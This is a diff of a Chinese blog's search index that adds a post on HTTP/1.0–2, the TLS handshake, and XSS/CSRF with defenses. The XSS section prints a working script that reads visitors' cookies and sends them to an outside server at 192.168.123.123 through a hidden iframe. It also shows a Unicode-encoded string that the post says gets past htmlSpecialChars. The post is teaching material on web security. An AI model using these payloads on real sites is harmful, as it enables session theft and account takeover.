+<h3 id="JSON-stringify完整语法"><a href="#JSON-stringify完整语法" class="headerlink" title="JSON.stringify完整语法"></a>JSON.stringify完整语法</h3><p>JSON的完整语法为： <code>JSON.stringify(value, replacer, space)</code>。</p>
 <p>其中：</p>
 <ol>
 <li><strong>value</strong> — 要编码的对象</li>
@@ -1652,10 +1458,9 @@
 <ol start="2">
 <li>使用映射函数</li>
 </ol>
-<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(b, <span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (key === <span class="string">&#x27;student&#x27;</span>) ? <span class="literal">undefined</span> : value;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
-<h3 id="自定义toJSON"><a href="#自定义toJSON" class="headerlink" title="自定义toJSON"></a>自定义toJSON</h3></li>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">JSON</span>.stringify(b, <span class="function"><span class="keyword">function</span> <span class="title">replacer</span>(<span class="params">key, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (key === <span class="string">&#x27;student&#x27;</span>) ? <span class="literal">undefined</span> : value;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li>
 </ul>
-<p><strong>说明：</strong>如果对象有<code>toJSON</code>方法，则<code>JSON.stringify</code>会自动调用该方法</p>
+<h3 id="自定义toJSON"><a href="#自定义toJSON" class="headerlink" title="自定义toJSON"></a>自定义toJSON</h3><p><strong>说明：</strong>如果对象有<code>toJSON</code>方法，则<code>JSON.stringify</code>会自动调用该方法</p>
 <p>例如：</p>
 <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  rank: <span class="number">1</span>,</span><br><span class="line">  <span class="function"><span class="title">toJSON</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.rank;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> b = &#123;</span><br><span class="line">  rank: <span class="number">2</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">b.teacher = a;</span><br><span class="line"></span><br><span class="line"><span class="built_in">JSON</span>.stringify(a); <span class="comment">// &#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">JSON</span>.stringify(b); <span class="comment">// &#x27;&#123;&quot;rank&quot;:2,&quot;teacher&quot;:1&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
 <h2 id="JSON-parse-—-将JSON字符串转换为合适的数据格式"><a href="#JSON-parse-—-将JSON字符串转换为合适的数据格式" class="headerlink" title="JSON.parse — 将JSON字符串转换为合适的数据格式"></a>JSON.parse — 将JSON字符串转换为合适的数据格式</h2><p>基本语法：<code>JSON.parse(str, reviver)</code></p>
@@ -1922,6 +1727,190 @@
       </categories>
       <tags>
         <tag>JavaScript</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HTTP&amp;网络安全篇</title>
+    <url>/2021/12/06/HTTP&amp;Network/</url>
+    <content><![CDATA[<p><strong>本篇文章主要针对常见的一些计算机网络概念进行梳理和总结，便于今后对于web开发的深入理解。</strong></p>
+<a id="more"></a>
+
+<h1 id="Network"><a href="#Network" class="headerlink" title="Network"></a>Network</h1><h2 id="HTTP协议篇"><a href="#HTTP协议篇" class="headerlink" title="HTTP协议篇"></a>HTTP协议篇</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>HTTP是基于TCP/IP协议的<strong>应用层协议</strong>。它不涉及数据报传输，主要规定了客服端与服务器的通信格式，默认使用80端口。</p>
+<h3 id="HTTP-1-0"><a href="#HTTP-1-0" class="headerlink" title="HTTP/1.0"></a>HTTP/1.0</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><ul>
+<li><p>1996年——发布</p>
+</li>
+<li><p>1.0版本较0.9版本中只有GET命令的情况，还引入了POST和HEAD命令。</p>
+</li>
+<li><p>HTTP请求和回应格式，除了包括<strong>数据部分</strong>还必须包括<strong>头信息即HTTP HEADER</strong>（用来描述元数据）</p>
+</li>
+</ul>
+<h4 id="请求格式"><a href="#请求格式" class="headerlink" title="请求格式"></a>请求格式</h4><p>请求命令+多行头信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.0 请求命令</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_10_5) 多行头信息</span><br><span class="line">Accept: *&#x2F;* 多行头信息</span><br></pre></td></tr></table></figure>
+<h4 id="回应格式"><a href="#回应格式" class="headerlink" title="回应格式"></a>回应格式</h4><p>头信息+空行+数据。第一行为协议版本+状态码+状态描述</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.0 200 OK 第一行</span><br><span class="line">Content-Type: text&#x2F;plain  从这儿开始是头信息</span><br><span class="line">Content-Length: 137582</span><br><span class="line">Expires: Thu, 05 Dec 1997 16:00:00 GMT</span><br><span class="line">Last-Modified: Wed, 5 August 1996 15:55:28 GMT</span><br><span class="line">Server: Apache 0.84</span><br><span class="line">        											这个是空行</span><br><span class="line">&lt;html&gt;												从这儿开始是数据</span><br><span class="line">  &lt;body&gt;Hello World&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="Content-Type-字段"><a href="#Content-Type-字段" class="headerlink" title="Content-Type 字段"></a>Content-Type 字段</h4><p>头信息为ASCII码，但数据可以为任意格式。因此需要用**<code>Content-Type</code>告诉客户端该数据的格式**。</p>
+<p>常见的<code>Content-Type</code>字段值如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">text&#x2F;plain</span><br><span class="line">text&#x2F;html</span><br><span class="line">text&#x2F;css</span><br><span class="line">image&#x2F;jpeg</span><br><span class="line">image&#x2F;png</span><br><span class="line">image&#x2F;svg+xml</span><br><span class="line">audio&#x2F;mp4</span><br><span class="line">video&#x2F;mp4</span><br><span class="line">application&#x2F;javascript</span><br><span class="line">application&#x2F;pdf</span><br><span class="line">application&#x2F;zip</span><br><span class="line">application&#x2F;atom+xml</span><br></pre></td></tr></table></figure>
+<p>这些数据类型统称为 <strong>MIME type</strong>，格式为：一级类型/二级类型。</p>
+<h4 id="Content-Encoding-字段"><a href="#Content-Encoding-字段" class="headerlink" title="Content-Encoding 字段"></a>Content-Encoding 字段</h4><p>由于<strong>发送的数据可以为任意格式</strong>，因此可以把数据压缩后再发送。**<code>Content-Encoding</code>字段说明数据的压缩方式**。常见压缩方法：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Encoding: compress</span><br><span class="line">Content-Encoding: deflate</span><br></pre></td></tr></table></figure>
+<p>同时<strong>客户端在请求时</strong>，可以说明自己所<strong>接受的压缩方式</strong>，使用**字段<code>Accept-Encoding</code>**。如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Accept-Encoding: gzip, deflate</span><br></pre></td></tr></table></figure>
+<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><p>HTTP/1.0 主要问题是：<strong>每个TCP连接只能发送一个请求</strong>。数据发送完毕，链接就关闭了。再请求其它资源，就必须再新建一个TCP连接。而TCP连接需要客户端与服务器三次握手，并且开始时由于slow start，速度很慢，因此新建TCP连接成本很高。</p>
+<p><strong>为了解决这个问题，部分浏览器使用了非标准字段<code>Connection</code>。</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+<p>上面这个字段要求服务器不要关闭TCP连接，以便其它请求复用，该可复用的TCP连接直到客户端或服务器主动关闭，才会断开。但这种方法并不标准。</p>
+<h3 id="HTTP-1-1"><a href="#HTTP-1-1" class="headerlink" title="HTTP/1.1"></a>HTTP/1.1</h3><p>从1997沿用至201几，直到HTTPS。</p>
+<h4 id="持久连接"><a href="#持久连接" class="headerlink" title="持久连接"></a>持久连接</h4><ul>
+<li>1.1版本<strong>最大的变化</strong>就是引入了<strong>持久连接（persistent connection）</strong>，即TCP连接默认不关闭，可以被多个请求复用，并且不用声明<code>Connection:keep-alive</code>。</li>
+<li>客户端与服务器之间一段时间没有通信，就会主动关闭连接。但规范做法是，客户端在最后一个请求时，发送<code>Connection: close</code>，明确要求服务器关闭TCP连接。</li>
+</ul>
+<p><strong>注：</strong>对于同一个域名，大多数浏览器允许同时建立<strong>6个持久连接</strong>。</p>
+<h4 id="管道机制"><a href="#管道机制" class="headerlink" title="管道机制"></a>管道机制</h4><p>在1.0版本中，在同一个TCP连接里，如果客户端要<strong>请求两个资源</strong>，会<strong>先发送A请求</strong>，然后等待服务器回应，<strong>收到响应</strong>之后<strong>再发送B请求</strong>。</p>
+<p>在1.1版本中引入了<strong>管道机制（pipelining）</strong>，其允许浏览器<strong>同时发送A请求和B请求</strong>，但服务器还是按照顺序，先回应A请求，完成之后再回应B请求。</p>
+<p>因此，管道机制使<strong>客户端可以在同一个TCP连接中同时发送多个请求</strong>。</p>
+<h4 id="Content-Length-字段"><a href="#Content-Length-字段" class="headerlink" title="Content-Length 字段"></a>Content-Length 字段</h4><p><strong>用于声明本次回应的数据长度。</strong></p>
+<h4 id="分块传输编码"><a href="#分块传输编码" class="headerlink" title="分块传输编码"></a>分块传输编码</h4><p>简言之，就是服务器<strong>产生一块数据就发送一块</strong>，即采用流模式（stream）取代缓存模式（buffer）。</p>
+<p>因此，1.1版本可以不使用<code>Content-Length</code>字段，而使用分块传输编码（chunked transfer encoding）。只要<strong>请求或回应的头信息中有<code>Transfer-Encoding</code>字段</strong>，就表明回应将由数量未定的数据块组成。</p>
+<p><strong>注：</strong>每个非空的数据块之前，会有一个16进制的数值来表示这个块的长度。最后是一个大小为0的块，表示本次回应的数据发送完毕。示例如下：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">25</span><br><span class="line">This is the data in the first chunk</span><br><span class="line"></span><br><span class="line">1C</span><br><span class="line">and this is the second one</span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">con</span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">sequence</span><br><span class="line"></span><br><span class="line">0</span><br></pre></td></tr></table></figure>
+<h4 id="其它功能"><a href="#其它功能" class="headerlink" title="其它功能"></a>其它功能</h4><ul>
+<li>1.1版本还新增了许多动词方法，如：<code>PUT</code>, <code>PATCH</code>, <code>HEAD</code>, <code>OPTIONS</code>, <code>DELETE</code></li>
+<li>客户端请求头信息<strong>新增了<code>HOST</code>字段</strong>，用来指定服务器的域名。有了<code>HOST</code>字段就可以将请求发往同一服务器上的不同网站。（为虚拟机兴起打下基础）</li>
+</ul>
+<h4 id="缺点-1"><a href="#缺点-1" class="headerlink" title="缺点"></a>缺点</h4><p>存在<strong>队头堵塞（Head-of-line blocking）</strong>。尽管允许复用TCP连接，但在<strong>同一个TCP连接里，数据通信依然是按次序进行</strong>，服务器只有处理完第一个请求的回应，才能进行下一个请求的回应。如果前一个请求的回应很慢，那么后面就会有许多请求排队。</p>
+<p>避免队头堵塞的方法有：</p>
+<pre><code>1. **减少请求次数**。例如：合并脚本和样式表、将图片嵌入CSS代码
+1. **同时多开持久连接**。例如：域名分片（domain sharding）即所需下载可以来自多个域，可以解决并发限制。
+</code></pre>
+<h3 id="HTTP-2"><a href="#HTTP-2" class="headerlink" title="HTTP/2"></a>HTTP/2</h3><h4 id="二进制协议"><a href="#二进制协议" class="headerlink" title="二进制协议"></a>二进制协议</h4><p>HTTP/1.1版本的头信息是文本（ASCII码），数据体是文本或二进制。但HTTP/2则是一个<strong>彻底的二进制协议</strong>，头信息和数据体都是二进制，并且统称为“帧”（frame）：头信息帧和数据帧。</p>
+<p>二进制协议的好处是：可以定义额外的帧。</p>
+<h4 id="多工-Multiplexing"><a href="#多工-Multiplexing" class="headerlink" title="多工 Multiplexing"></a>多工 Multiplexing</h4><p>在HTTP/2中，在同一个TCP连接中，客户端和浏览器都可以同时发送多个请求和响应，并且不用按照顺序一一对应，这就避免了队头堵塞的问题。</p>
+<p>例如：在一个TCP连接中，服务器同时收到A请求和B请求，于是先回应A请求，结果发现处理十分耗时，于是就发送A请求已处理好的部分，接着处理回应B请求，完成之后，再处理发送A请求的剩下的部分。我们称这种<strong>双工的、实时的通信</strong>为<strong>多工</strong>。</p>
+<h4 id="数据流"><a href="#数据流" class="headerlink" title="数据流"></a>数据流</h4><p>HTTP/2的<strong>数据包是不按顺序发送的</strong>，同一个连接里面连续的数据包，可能属于不同的回应，因此需要<strong>对数据包进行标记</strong>，指出它属于哪个回应。</p>
+<p>HTTP/2将<strong>每个请求或者回应的所有数据包</strong>都称为一个<strong>数据流（stream）</strong>。每个数据流都有一个唯一的编号。数据包发送的时候，必须标记数据流ID，一标识它属于哪个数据流。此外客户端发出的数据流ID一律为奇数，服务端发出的数据流ID一律为偶数。</p>
+<p>数据流发送到一半时，客户端和服务器都可以发出信号来取消这个数据流。在HTTP/1.1版本中，取消数据流发送的唯一方法是关闭TCP连接。HTTP/2可以取消某一次请求同时保证TCP连接还是开启的状态，可以被其它请求复用。</p>
+<p>客户端还可以指定数据流的优先级，优先级越高，服务器会越早对其回应。</p>
+<h4 id="头信息压缩"><a href="#头信息压缩" class="headerlink" title="头信息压缩"></a>头信息压缩</h4><p>由于每次请求，很多<strong>请求头信息中的字段都是重复的</strong>（如Cookie、User Agent等），这会造成很多带宽的浪费。HTTP/2优化了这一点，引入<strong>头信息压缩机制</strong>。一方面，头信息<strong>使用<code>gzip</code><strong>等方法压缩后再发送；另一方面，客户端和服务端维护一张</strong>头信息表</strong>，该表为<strong>字段和索引号的映射</strong>，之后就只发送索引号，以提高速度。</p>
+<h4 id="服务器推送"><a href="#服务器推送" class="headerlink" title="服务器推送"></a>服务器推送</h4><p>HTTP/2允许服务器未收到请求，主动向客户端发送资源。</p>
+<p>例如：客户端请求一个包含很多静态资源的网页，服务器会主动把这些静态资源随网页一起发送给客户端，这样就不需要等客户端收到网页后解析HTML发现有静态资源再请求静态资源了。</p>
+<h2 id="HTTPS——番外篇"><a href="#HTTPS——番外篇" class="headerlink" title="HTTPS——番外篇"></a>HTTPS——番外篇</h2><p>互联网的通信安全是建立在<strong>SSL/TLS</strong>协议之上的。</p>
+<p><strong>注</strong>：SSL——<strong>Secure Sockets Layer</strong>, TLS——SSL的升级</p>
+<h3 id="使用HTTPS的原因-amp-作用"><a href="#使用HTTPS的原因-amp-作用" class="headerlink" title="使用HTTPS的原因&amp;作用"></a>使用HTTPS的原因&amp;作用</h3><p><strong>对比：</strong></p>
+<ul>
+<li><p>HTTP不使用SSL/TLS，因此是不加密的通信，所有信息都是明文传播</p>
+<ol>
+<li><strong>窃听风险（eavesdropping）：</strong>第三方可以截获并获知通信内容</li>
+<li><strong>篡改风险（tampering）：</strong>第三方可以截获并修改通信内容</li>
+<li><strong>冒充风险（pretending）：</strong>第三方可以冒充他人身份参与通信</li>
+</ol>
+</li>
+<li><p>基于SSL/TLS协议的HTTPS的好处</p>
+<ol>
+<li><strong>所有信息都是加密传输</strong>——无法被窃听</li>
+<li><strong>具有校验机制</strong>——通信内容一旦被篡改，通信双方都能发现</li>
+<li><strong>配备身份证书</strong>——防止身份冒充</li>
+</ol>
+</li>
+</ul>
+<h3 id="SSL-TLS协议的基本运行过程"><a href="#SSL-TLS协议的基本运行过程" class="headerlink" title="SSL/TLS协议的基本运行过程"></a>SSL/TLS协议的基本运行过程</h3><p>该协议的基本思路为：<strong>非对称加密：公钥加密，私钥解密</strong>。即客户端先向服务端索要公钥，然后再用公钥加密信息，服务器收到密文后，用自己的私钥解密。</p>
+<ol>
+<li><p><strong>保证公钥不被篡改的方法</strong></p>
+<p>答：将<strong>公钥放入数字证书</strong>中，只要证书是可信的，那么公钥就是可信的。</p>
+</li>
+<li><p><strong>用公钥加密计算量太大，需要减少耗用时间的方法</strong></p>
+<p>答：每一次对话（session），客户端和服务端会生成一个“对话密钥”（session key），用它来加密信息。由于“对话密钥”是对称加密，因此运算速度非常快，因此如果服务器公钥只用于加密“对话密钥”本身的话，就会大大减少加密运算的消耗时间。</p>
+</li>
+</ol>
+<p>所以，SSL/TLS协议的基本过程是：</p>
+<ol>
+<li>客户端向服务端<strong>索要并验证公钥</strong> —— 握手阶段</li>
+<li>双方协商<strong>生成“对话密钥”</strong>              —— 握手阶段</li>
+<li>双方采用“对话密钥”<strong>进行加密通信</strong></li>
+</ol>
+<h3 id="握手阶段"><a href="#握手阶段" class="headerlink" title="握手阶段"></a>握手阶段</h3><p>握手阶段涉及四次通信，该阶段的所有通信都是明文的。</p>
+<h4 id="阶段一：客户端发出请求"><a href="#阶段一：客户端发出请求" class="headerlink" title="阶段一：客户端发出请求"></a>阶段一：客户端发出请求</h4><p>首先，客户端向服务器发送加密通信请求。其发送的请求内容主要有以下：</p>
+<ol>
+<li>支持的协议版本，例如：TLS 1.0</li>
+<li>客户端生成的随机数，用于稍后生成“对话密钥”</li>
+<li>支持的加密方法，例如：RSA公钥加密</li>
+<li>支持的压缩方法</li>
+</ol>
+<h4 id="阶段二：服务器回应"><a href="#阶段二：服务器回应" class="headerlink" title="阶段二：服务器回应"></a>阶段二：服务器回应</h4><p>服务器收到客户端请求后，向客户端发出响应。响应内容主要包括以下：</p>
+<ol>
+<li>确认使用的加密通信协议版本。如果双方支持的版本不一致，则服务器会关闭本次加密通信</li>
+<li>服务器生成的随机数，用于稍后生成“对话密钥”</li>
+<li>确认使用的加密方法</li>
+<li>服务器证书</li>
+</ol>
+<h4 id="阶段三：客户端回应"><a href="#阶段三：客户端回应" class="headerlink" title="阶段三：客户端回应"></a>阶段三：客户端回应</h4><p>客户端收到服务器的响应后，首先要验证服务器的数字证书。</p>
+<p>如果<strong>1. 证书不可信。2. 证书中的域名与实际域名不一致。3. 证书已经过期</strong>，就会向访问者显示一个警告，让其选择是否继续通信。</p>
+<p>如果证书没有问题，客户端会<strong>从证书中取出服务器的公钥</strong>，然后向服务器发送响应，其内容主要如下：</p>
+<ol>
+<li>客户端生成的随机数。该随机数用公钥加密，防止被窃听。</li>
+<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
+<li>客户端握手结束通知。表示客户端的握手阶段结束，这一项也是前面发送的所有内容的hash值，用来供服务器校验。</li>
+</ol>
+<p><strong>注：</strong>这个阶段生成的随机数是整个握手阶段出现的第三个随机数（”pre-master key”）。有了它之后，客户端和服务器就都同时有了三个随机数，然后双方用事先商定的加密方法，各自生成本次会话所用的同一把“会话密钥”。</p>
+<h4 id="阶段四：服务器最后回应"><a href="#阶段四：服务器最后回应" class="headerlink" title="阶段四：服务器最后回应"></a>阶段四：服务器最后回应</h4><p>服务器收到第三个随机数之后，会计算生成本次会话所用的“会话密钥”。然后向客户端发送最后响应。其内容主要如下：</p>
+<ol>
+<li>编码改变通知。表示随后的信息将用双方商定的加密方法和密钥发送。</li>
+<li>服务器握手结束通知。表示服务器的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。</li>
+</ol>
+<p>至此，整个握手阶段全部结束。接下来就是，客户端与服务器进行加密通信，这就完全是<strong>使用普通的HTTP协议</strong>了，只不过所<strong>发送的内容都使用“会话密钥”进行了加密</strong>。</p>
+<h2 id="网络安全篇"><a href="#网络安全篇" class="headerlink" title="网络安全篇"></a>网络安全篇</h2><h3 id="XSS——跨站脚本"><a href="#XSS——跨站脚本" class="headerlink" title="XSS——跨站脚本"></a>XSS——跨站脚本</h3><h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>XSS，全称为<strong>Cross-site scripting</strong>，中文名称为跨站脚本，是一种<strong>对网络应用程序的安全漏洞的攻击</strong>，即是一种<strong>代码注入</strong>。这类攻击通常包含了HTML和用户脚本语言（主要为JavaScript）。</p>
+<p>例如，用JavaScript在网站论坛上发布一段恶意的JavaScript代码，这就是脚本注入，而同时如果这个代码内容有请求外部服务器的功能，那么就叫做XSS。</p>
+<p>因此，可以理解为<strong>XSS（跨站脚本）= 脚本注入 + 请求外部服务器的功能</strong>。</p>
+<h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><p>例如，在某论坛网站中的发帖内容写下如下代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span></span><br><span class="line"><span class="javascript">    alert(<span class="string">&#x27;一直弹窗&#x27;</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>假设该论坛网站没有任何过滤及其它防御机制的情况下，任何访问这个帖子的用户，都会在客户端界面一直弹出这个弹窗。</p>
+<p><strong>这就是最简单的脚本注入。</strong>当然这个脚本并没有什么实质性的危害，那么XSS就是基于脚本注入的方法来完成，但它注入的是含有请求跨站功能的脚本。</p>
+<p>例如，在上面提到的论坛网站中，注入如下代码：</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  (<span class="function"><span class="keyword">function</span>(<span class="params"><span class="built_in">window</span>, <span class="built_in">document</span></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 构造泄露信息用的 URL</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> cookies = <span class="built_in">document</span>.cookie;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURIBase = <span class="string">&quot;http://192.168.123.123/myxss/&quot;</span>;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xssURI = xssURIBase + <span class="built_in">window</span>.encodeURI(cookies);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 建立隐藏 iframe 用于通讯</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> hideFrame = <span class="built_in">document</span>.createElement(<span class="string">&quot;iframe&quot;</span>);</span></span><br><span class="line">    hideFrame.height = 0;</span><br><span class="line">    hideFrame.width = 0;</span><br><span class="line"><span class="javascript">    hideFrame.style.display = <span class="string">&quot;none&quot;</span>;</span></span><br><span class="line">    hideFrame.src = xssURI;</span><br><span class="line"><span class="javascript">    <span class="comment">// 开工</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.body.appendChild(hideFrame);</span></span><br><span class="line"><span class="javascript">&#125;)(<span class="built_in">window</span>, <span class="built_in">document</span>);</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>该段代码会将任何访问该帖子的用户的cookie传给一个为<code>http://192.168.123.123/myxss/</code>的服务器，该服务器可以拿着这个cookie访问对应的网站，并登录该用户的账号，继而可以进行其它操作。</p>
+<p>因此，上面这段代码就是XSS。</p>
+<h3 id="CSRF——跨站请求伪造"><a href="#CSRF——跨站请求伪造" class="headerlink" title="CSRF——跨站请求伪造"></a>CSRF——跨站请求伪造</h3><h4 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h4><p>CSRF，全称为<strong>Cross-site request forgery</strong>，中文名为跨站请求伪造。是一种让用户在当前已登录的Web应用程序上<strong>执行一些非本意的操作</strong>（如改名，删帖，发邮件等）的攻击方法。</p>
+<h4 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h4><p>一般来说，CSRF是由XSS实现的，在跨站脚本的基础上，实现伪造请求，导致受害者会执行一些自己本不愿意执行的操作。</p>
+<p><strong>注：CSRF也可以不通过XSS来实现。</strong></p>
+<h4 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h4><p>还是以上面的对某论坛网站的XSS攻击为例，在外部服务器成功获得用户的cookie后，它可以利用cookie，伪造成用户对论坛网站发起一系列的请求，例如修改用户名称，修改用户密码等。此时，就可以称该攻击为CSRF。</p>
+<h3 id="防范XSS和CSRF⭐️"><a href="#防范XSS和CSRF⭐️" class="headerlink" title="防范XSS和CSRF⭐️"></a>防范XSS和CSRF⭐️</h3><p><em><strong>核心思想：不相信任何外部来源数据！！！</strong></em></p>
+<p>一般来说，大部分的CSRF都是基于XSS的，因此可以说防住了XSS，也就基本防住了CSRF。</p>
+<p>对于防范XSS，主要有以下两个方法：</p>
+<ol>
+<li><strong>输入过滤：对外部输入进行彻底的敏感字符过滤</strong>——前端+后端</li>
+<li><strong>输出过滤：在显示在页面上时，做一些处理让敏感的代码脚本无法顺利执行</strong>——前端</li>
+</ol>
+<p>理论上，只要有输入数据的的地方，就存在XSS的漏洞，JavaScript的脚本可以以各种形式（如明文、编码等）注入到数据库中。</p>
+<p>就像上面提到的 JS 会以各种非法形式注入，其主要非法形式有两类：</p>
+<ol>
+<li><p><strong>明文：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  ... <span class="comment">// js 恶意代码</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>​        要处理好明文注入的过滤。</p>
+</li>
+<li><p><strong>编码：</strong></p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">u0026u006cu0074u003bu0073u0063u0072u0069u0070u0074u0026u0067u0074u003bu0061u006cu0065u0072u0074u0028u0026u0023u0033u0039u003bu6211u662fu0078u0073u0073uff0cu4f60u6709u9ebbu70e6u4e86u0026u0023u0033u0039u003bu0029u0026u006cu0074u003bu002fu0073u0063u0072u0069u0070u0074u0026u0067u0074u003b</span><br></pre></td></tr></table></figure>
+<p>上面这个编码为unicode编码，它可以绕过<code>htmlSpecialChars</code>的过滤并入库，然后在展示该信息的时候，html 会自动将unicode编码转换成明文即真正的可执行脚本。</p>
+<p>由于不仅unicode编码可以注入，其它类型的编码也可以（道理类似），我们需要尽量将页面的字符编码统一设置为一种（如unicode: utf-8），这样便于我们专注于处理unicode编码的注入。</p>
+</li>
+</ol>
+<h4 id="其它一些通用的防范方法"><a href="#其它一些通用的防范方法" class="headerlink" title="其它一些通用的防范方法"></a>其它一些通用的防范方法</h4><ol>
+<li><p>在输出html时，加上<code>Content Security Policy</code>的<code>Http Header</code></p>
+<p>作用：防止页面被XSS攻击时，嵌入第三方的脚本文件</p>
+</li>
+<li><p>在设置Cookie时，加上<code>HttpOnly</code>参数</p>
+<p>作用：可以防止页面被XSS攻击时，Cookie信息被盗取</p>
+<p>缺点：网站本身的<code>JavaScript</code>代码也无法操作Cookie</p>
+</li>
+<li><p>在开发API时，检验请求的Referer参数</p>
+<p>作用：可以在一定程度上防止CSRF攻击</p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>Network</category>
+      </categories>
+      <tags>
+        <tag>HTTP</tag>
       </tags>
   </entry>
 </search>
